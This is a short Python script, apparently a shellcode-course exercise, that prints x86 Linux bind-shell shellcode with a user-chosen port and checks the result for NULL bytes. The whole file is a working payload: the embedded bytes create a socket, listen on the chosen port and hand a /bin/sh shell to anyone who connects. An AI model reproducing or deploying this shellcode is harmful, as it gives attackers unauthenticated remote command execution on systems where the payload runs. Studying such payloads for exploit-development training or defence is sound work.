#!/usr/bin/python3
# Author: Michael Norris
# Usage: python3 ConfShell.py [BIND_PORT]

import socket
import sys 


def hex_htons(num):
    if 0 < num < 65536:
        return '0x' + '%04x' % socket.htons(num)
    else:
        print('[!] Please select a valid port.')
        exit(1)


def sc_port(port):
    hex_htons_port = hex_htons(port)[2:]
    b1 = hex_htons_port[:2]
    b2 = hex_htons_port[2:]
    return "\\x{b2}\\x{b1}".format(b2 = b2, b1 = b1)


def replace_sc(sc):
    return sc.replace(base_port, replacement_port)


def new_code(sc):
    new_code = replace_sc(sc)
    if new_code.find("\\x00") == -1: 
        return new_code
    else:
        print('[!] The selected port will result in a NULL byte in the shellcode.')
        print('[*] Please choose a different port!')
        exit(1)


base_port = sc_port(4444)
replacement_port = sc_port(int(sys.argv[1]))

bind_sc = ""
bind_sc += "\\x31\\xd2\\x31\\xc9\\x31\\xdb\\x31\\xc0"
bind_sc += "\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xfe"
bind_sc += "\\xc3\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x52"
bind_sc += "\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89"
bind_sc += "\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xfe"
bind_sc += "\\xc3\\xb0\\x66\\xcd\\x80\\x52\\x56\\x89"
bind_sc += "\\xe1\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x52"
bind_sc += "\\x52\\x56\\x89\\xe1\\xfe\\xc3\\xb0\\x66"
bind_sc += "\\xcd\\x80\\x89\\xd1\\x89\\xc3\\xb0\\x3f"
bind_sc += "\\xcd\\x80\\xfe\\xc1\\xb0\\x3f\\xcd\\x80"
bind_sc += "\\xfe\\xc1\\xb0\\x3f\\xcd\\x80\\x52\\x68"
bind_sc += "\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69"
bind_sc += "\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89"
bind_sc += "\\xe1\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) == 2:
    pass
else:
    print('[*] Usage: python3 {filename} [BIND_PORT]'.format(filename = sys.argv[0]))
    exit(1)

print(new_code(bind_sc))
